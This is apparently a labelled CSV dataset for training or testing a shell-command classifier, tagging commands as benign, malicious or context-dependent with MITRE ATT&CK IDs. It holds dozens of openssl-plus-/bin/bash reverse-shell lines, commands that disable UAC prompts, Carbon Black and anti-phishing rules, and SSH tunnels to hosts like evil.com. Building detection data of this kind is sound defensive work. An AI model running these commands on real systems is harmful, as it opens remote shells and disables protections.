command,label,original_label,mitre_id
"mailx < content.txt [-s|--subject] ""subject"" to_addr",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:8081,Malicious,Synthetic,Synthetic
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force,Malicious,Malicious,T1548
ts-node [-T|--transpileOnly] path/to/file.ts,Benign,Benign,Benign
qm [clou|cloudinit] [d|dump] virtual_machine_id meta|network|user,Benign,Benign,Benign
find ~ -name 'Foto*',Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.50:22,Malicious,Synthetic,Synthetic
find -user eric -print,Benign,Benign,Benign
wafw00f [-t|--test] Cloudflare|Cloudfront|Fastly|ZScaler|... https://www.example.com,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:9001 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:3306,Malicious,Synthetic,Synthetic
fusermount -u path/to/mount_point,Benign,Benign,Benign
lsipc --shmems|--queues|--semaphores,Benign,Benign,Benign
apktool if path/to/framework.apk,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:6379,Malicious,Synthetic,Synthetic
tcpdump -i any -n -c 9090,Context_Dependent,Synthetic,Synthetic
iperf [-u|--udp] [-s|--server] [-p|--port] 5001,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:1433,Malicious,Synthetic,Synthetic
pnmhistmap path/to/input.pnm > path/to/output.pnm,Benign,Benign,Benign
onefetch,Benign,Benign,Benign
"expr index ""string"" ""chars""",Benign,Benign,Benign
sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist,Malicious,Malicious,T1562
mutt -s subject -c cc@example.com recipient@example.com,Benign,Benign,Benign
git status --show-stash,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.1:3306 admin@10.10.10.25,Context_Dependent,Synthetic,Synthetic
ppmtomitsu [-m|-media] A|A4|AS|A4S path/to/file.ppm > path/to/file.mitsu,Benign,Benign,Benign
"socat TCP-LISTEN:5555,fork -",Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:6379,Malicious,Synthetic,Synthetic
"playerctl metadata [-f|--format] ""{{Now playing: \{\{artist\}\} - \{\{album\}\} - \{\{title\}\}}}""",Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.50:1433 svcuser@10.0.0.10,Context_Dependent,Synthetic,Synthetic
away [-p|--persist] message,Benign,Benign,Benign
ccache [-C|--clear],Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:1433,Malicious,Synthetic,Synthetic
yamllint [-h|--help],Benign,Benign,Benign
"find / -iname ""*.mp3"" -type f | xargs -I '{}' mv {} /mnt/mp3",Context_Dependent,Benign,Benign
java -jar jenkins-cli.jar -s jenkins_server_url help,Benign,Benign,Benign
"find $target -type f -iname ""*.txt""",Benign,Benign,Benign
"python sqlmap.py [-u|--url] ""http://www.example.com/vuln.php"" --auth-type Basic --auth-cred ""testuser:testpass""",Benign,Benign,Benign
moe [-B|--no-backup] path/to/file,Benign,Benign,Benign
pathping hostname -n,Benign,Benign,Benign
fvm releases,Benign,Benign,Benign
ssh -fN -L 8080:10.10.10.10:80 audit@10.0.0.5,Context_Dependent,Synthetic,Synthetic
"find . -depth -name '* *' | while IFS= read -r f ; do mv -i ""$f"" ""$(dirname ""$f"")/$(basename ""$f""|tr ' ' _)"" ; done",Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:8443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
"echo -e ""Column 1\tColumn 2""",Benign,Benign,Benign
startx /path/to/window_manager_or_desktop_environment,Benign,Benign,Benign
"sudo ln -s -f ""/usr/local/bin/findpdftext"" ""/usr/local/bin/fpdf""",Benign,Benign,Benign
tcpdump -i wlan0 port 5432,Context_Dependent,Synthetic,Synthetic
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography MachineGuid,Context_Dependent,Malicious,T1012
tcpdump -i ens33 -nn,Context_Dependent,Synthetic,Synthetic
find $root -type d | tr '\n' ':',Benign,Benign,Benign
"copy ""$exe_path"" %temp%\T1036.007_masquerading.pdf.exe /Y",Malicious,Malicious,T1036
npm repo --workspace workspace_name,Benign,Benign,Benign
unison path/to/directory_1 path/to/directory_2 -auto,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:22,Malicious,Synthetic,Synthetic
tb [-m|--move] @item_id board_name,Benign,Benign,Benign
wkhtmltopdf --orientation Landscape|Portrait input.html output.pdf,Benign,Benign,Benign
Evilginx2,Malicious,Malicious,T1539
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.100:8081,Malicious,Synthetic,Synthetic
vim /opt/app/app.py,Benign,Synthetic,Synthetic
"echo ""text"" | espeak-ng",Benign,Benign,Benign
secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt,Context_Dependent,Malicious,T1201
dot path/to/input.gv | gvcolor | dot -T png > path/to/output.png,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:53,Malicious,Synthetic,Synthetic
qm [mt|mtunnel],Benign,Benign,Benign
tig stash,Benign,Benign,Benign
SecurityCenter2.AntiVirusProduct,Context_Dependent,Malicious,T1518
openssl s_client -quiet -connect 192.168.1.1:6379 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
pw-link [-lI|--links --id],Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.10:110 svcuser@192.168.1.1,Context_Dependent,Synthetic,Synthetic
lpoptions -d printer -o option,Benign,Benign,Benign
Disconnect-ExchangeOnline -Confirm:$false,Malicious,Malicious,T1098
openssl s_client -quiet -connect 192.168.1.10:22 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
VBoxManage controlvm uuid|vm_name reset,Benign,Benign,Benign
openclaw gateway [-h|--help],Benign,Benign,Benign
grep -v 'kpt#' data.txt | nl -nln,Benign,Benign,Benign
compseq -sequence path/to/input_rna.fasta -word 3 path/to/output_file.comp -nozero -frame 1,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:5432,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:9002,Malicious,Synthetic,Synthetic
"strace -f -e trace=open,read,write -p 53",Context_Dependent,Synthetic,Synthetic
pandoc path/to/input.md [-o|--output] path/to/output.pdf,Benign,Benign,Benign
ssh -fN -L 8080:172.20.10.8:995 user@10.0.0.5,Context_Dependent,Synthetic,Synthetic
disown,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
beep -f frequency -l duration,Benign,Benign,Benign
meshnamed -getname 200:6fc8:9220:f400:5cc2:305a:4ac6:967e,Benign,Benign,Benign
gradle wrapper --distribution-type bin|all,Benign,Benign,Benign
llc -relocation-model=pic path/to/input.ll,Benign,Benign,Benign
udiskie-umount --eject path/to/mount,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:6379,Malicious,Synthetic,Synthetic
gh variable set name,Benign,Benign,Benign
tcpdump -i ens33 port 3306,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:53,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:5432 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
"find . -name ""*.html"" -print | xargs -l -i wc {}",Benign,Benign,Benign
tcpdump -i wlan0 port 8888,Context_Dependent,Synthetic,Synthetic
spectacle,Benign,Benign,Benign
git ls-files | xargs -d '\n' wc -l,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:8888 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
kaggle [c|competitions] download competition_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:3389 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:4445,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.20.30.40:6379 support@evil.com,Context_Dependent,Synthetic,Synthetic
"find . -name ""S1A*1S*SAFE"" | rev | awk -F '/' '{print $1}' | rev | sort -t _ -k 5",Benign,Benign,Benign
ps -p 24297 -o comm --no-heading,Context_Dependent,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:4444,Malicious,Synthetic,Synthetic
rdp_check.py domain/username:password@target,Benign,Benign,Benign
jj config [u|unset] --repo name,Benign,Benign,Benign
pmount [-t|--type] iso9660 [-r|--read-only] /dev/cdrom,Benign,Benign,Benign
find . -type f -name '*.php' -exec chmod 644 {} \;,Benign,Benign,Benign
tput rev,Benign,Benign,Benign
7za x path/to/archive.7z,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
aurvote package1 package2 ...,Benign,Benign,Benign
vkcube --wsi xlib|wayland|...,Benign,Benign,Benign
$xlApp.Quit(),Malicious,Malicious,T1204
"write-output ""------------""| out-file $output_file -append",Context_Dependent,Malicious,T1012
trunk tools list,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:8081,Malicious,Synthetic,Synthetic
find sort_test/ -type f | env -i LC_COLLATE=C sort,Benign,Benign,Benign
ssh -fN -L 8080:192.168.1.254:80 root@10.0.0.10,Context_Dependent,Synthetic,Synthetic
lambo new [-l|--link] app_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:5432,Malicious,Synthetic,Synthetic
git diff-files --summary,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:143 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
dotnet ef dbcontext list,Benign,Benign,Benign
jira open issue_id [-n|--no-browser],Benign,Benign,Benign
cargo init --name name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 172.16.0.25:9090,Malicious,Synthetic,Synthetic
strace -e trace=network -p 1433,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:110 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
spf path/to/directory,Benign,Benign,Benign
rmdir --ignore-fail-on-non-empty newBaseDir/Data/NewDataCopy,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.10:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:9002,Malicious,Synthetic,Synthetic
pacconf --single,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.100:443 user@172.16.0.10,Context_Dependent,Synthetic,Synthetic
nemo --geometry=600x400 path/to/directory,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
chown -R www-data /var/www/.gnome2 /var/www/.config /var/www/.config/inkscape,Benign,Benign,Benign
find . -mindepth 1 -exec mv -t /tmp {} +,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:53 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 172.20.10.8:1433,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.25:9090,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.1:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:8081,Malicious,Synthetic,Synthetic
particle flash device_name path/to/program.bin,Benign,Benign,Benign
vidir [-v|--verbose] path/to/directory1 path/to/directory2 ...,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:5432 | /bin/bash | openssl s_client -quiet -connect 10.0.0.10:4445,Malicious,Synthetic,Synthetic
gcloud config configurations activate configuration_name,Benign,Benign,Benign
tldr apx pkgmanagers,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:5432,Malicious,Synthetic,Synthetic
sudo rm /var/lib/mongodb/mongod.lock,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:443 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
sudo zerotier-cli leave network_id,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:995 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:993 | /bin/bash | openssl s_client -quiet -connect 10.0.0.8:9002,Malicious,Synthetic,Synthetic
az feedback,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.1:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:4444,Malicious,Synthetic,Synthetic
idevicecrashreport --extract path/to/directory,Benign,Benign,Benign
tcpdump -i enp0s3 port 4444,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.8:3306 root@10.0.0.5,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.10:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:993,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:443,Malicious,Synthetic,Synthetic
gh [cs|codespace] delete,Benign,Benign,Benign
Get-Help command -Full,Benign,Benign,Benign
protontricks [-h|--help],Benign,Benign,Benign
ssh -w 0:0 svcuser@target.com,Context_Dependent,Synthetic,Synthetic
find /var/www -maxdepth 4 -name 'restore.php' -exec rm -r {} \;,Benign,Benign,Benign
pdfjam path/to/file1.pdf last-1 path/to/file2.pdf last-1 ... --suffix reversed,Benign,Benign,Benign
find /usr -type l,Benign,Benign,Benign
ssh -fN -L 8080:192.168.0.5:1433 audit@staging.lab,Context_Dependent,Synthetic,Synthetic
sipcalc [-r|--v6rev] 2001:db8::/32,Benign,Benign,Benign
"find / -name ""*"" — print",Context_Dependent,Benign,Benign
ssh -fN -L 8080:192.168.1.100:1433 admin@10.10.10.25,Context_Dependent,Synthetic,Synthetic
hledger print assets:cash | hledger [-f|--file] - [-I|--ignore-assertions] aregister expenses:food,Benign,Benign,Benign
uv publish [-t|--token] your_api_token,Benign,Benign,Benign
slurmdbd -V,Benign,Benign,Benign
"find / -type d -iname ""project.images"" -ls",Context_Dependent,Benign,Benign
ssh -fN -L 8080:10.0.0.10:80 backup@10.10.10.10,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:995,Malicious,Synthetic,Synthetic
chown -R tomcat7:tomcat7 webapps temp logs work conf,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 192.168.1.254:445,Malicious,Synthetic,Synthetic
ScDeviceEnums,Malicious,Malicious,T1036
latexdiff --type=BOLD old.tex new.tex > diff.tex,Benign,Benign,Benign
find file -prune -cmin +60 -print | grep -q .,Benign,Benign,Benign
tail -50 /var/log/nginx/access.log,Context_Dependent,Synthetic,Synthetic
cat /etc/hostname,Benign,Synthetic,Synthetic
u3d available,Benign,Benign,Benign
lualatex -jobname=filename path/to/file.tex,Benign,Benign,Benign
vim /var/lib/package.json,Benign,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:8888 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:9002,Malicious,Synthetic,Synthetic
docker exec worker ls /app,Benign,Synthetic,Synthetic
sed [-i|--in-place] 's/apple/mango/g' path/to/file,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.10:143 backup@172.16.0.10,Context_Dependent,Synthetic,Synthetic
doctl [k|kubernetes] [c|cluster] [cfg|kubeconfig] [s|save] cluster_name,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:4445,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:443 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:4445,Malicious,Synthetic,Synthetic
set +m,Benign,Benign,Benign
find . -type f -name \*.ext | xargs grep foo,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 192.168.1.10:993,Malicious,Synthetic,Synthetic
"yes ""$OPTARG"" | head -$opt",Benign,Benign,Benign
gitlab job_play project_name job_id,Benign,Benign,Benign
vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:,Malicious,Malicious,T1202
openssl s_client -quiet -connect 192.168.1.100:80 | /bin/bash | openssl s_client -quiet -connect 192.168.0.5:8081,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8888,Malicious,Synthetic,Synthetic
lspci -k,Benign,Benign,Benign
cwebp path/to/image_file -o path/to/output.webp -resize width height,Benign,Benign,Benign
j [-s|--stat],Benign,Benign,Benign
paccapability --version,Benign,Benign,Benign
theHarvester -d evil.com -b google,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 192.168.1.1:443,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:9001 | /bin/bash | openssl s_client -quiet -connect 172.16.0.10:445,Malicious,Synthetic,Synthetic
paclog --warnings,Benign,Benign,Benign
ssh -fN -L 8080:10.0.0.8:143 deploy@assets-dropper.net,Context_Dependent,Synthetic,Synthetic
sshuttle -r deploy@10.0.0.1 0/0,Context_Dependent,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:4444 | /bin/bash | openssl s_client -quiet -connect 10.10.10.10:8080,Malicious,Synthetic,Synthetic
"kdeconnect-cli --name ""device_name"" --unlock",Benign,Benign,Benign
unsetopt option_name1 option_name2 ...,Benign,Benign,Benign
make /tmp/hello,Malicious,Malicious,T1548
openssl s_client -quiet -connect 192.168.1.100:110 | /bin/bash | openssl s_client -quiet -connect 10.10.10.50:9002,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.254:4444 | /bin/bash | openssl s_client -quiet -connect 10.0.0.5:995,Malicious,Synthetic,Synthetic
%SystemDrive%\BypassDir\cscript //nologo %windir%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty,Malicious,Malicious,T1220
openssl s_client -quiet -connect 192.168.1.100:8080 | /bin/bash | openssl s_client -quiet -connect 10.10.10.25:6379,Malicious,Synthetic,Synthetic
openssl s_client -quiet -connect 192.168.1.100:6379 | /bin/bash | openssl s_client -quiet -connect 10.20.30.40:9002,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:192.168.0.5:80 deploy@10.10.10.25,Context_Dependent,Synthetic,Synthetic
Disable-AntiPhishRule -Identity $test.Name -Confirm:$false,Malicious,Malicious,T1562
find . -size +4096k -print,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.254:9090 | /bin/bash | openssl s_client -quiet -connect 10.0.0.1:8081,Malicious,Synthetic,Synthetic
ssh -fN -L 8080:10.0.0.1:4444 backup@10.0.0.50,Context_Dependent,Synthetic,Synthetic
ssh -fN -L 8080:10.10.10.50:143 user@10.0.0.100,Context_Dependent,Synthetic,Synthetic
runcon user_u:role_r:domain_t command,Benign,Benign,Benign
mkdir .hiddendir,Benign,Benign,Benign
buku keyword [-t|--stag] privacy,Benign,Benign,Benign
openssl s_client -quiet -connect 192.168.1.25:143 | /bin/bash | openssl s_client -quiet -connect 192.168.1.100:8081,Malicious,Synthetic,Synthetic
"gendesk -n --name ""app"" --exec ""/path/to/app"" --icon ""/path/to/icon.png"" --comment ""This is application""",Benign,Benign,Benign
kwallet-query kdewallet [-l|--list-entries],Benign,Benign,Benign
nstat [-a|--ignore],Benign,Benign,Benign
lazygit [-l|--logs],Benign,Benign,Benign
sfdk build-requires --no-refresh subcommand,Benign,Benign,Benign
xfce4-screenshooter [-f|--fullscreen],Benign,Benign,Benign
find `gen_root_dirs.sh` -type f -size 0 -ls,Benign,Benign,Benign
CreateMutexW(),Malicious,Malicious,T1480
which python,Context_Dependent,Benign,Benign
"find . -name '*.txt' -not -name ""all.txt"" | xargs cat > all.txt",Benign,Benign,Benign
magick *.jpg -adjoin path/to/file.pdf,Benign,Benign,Benign
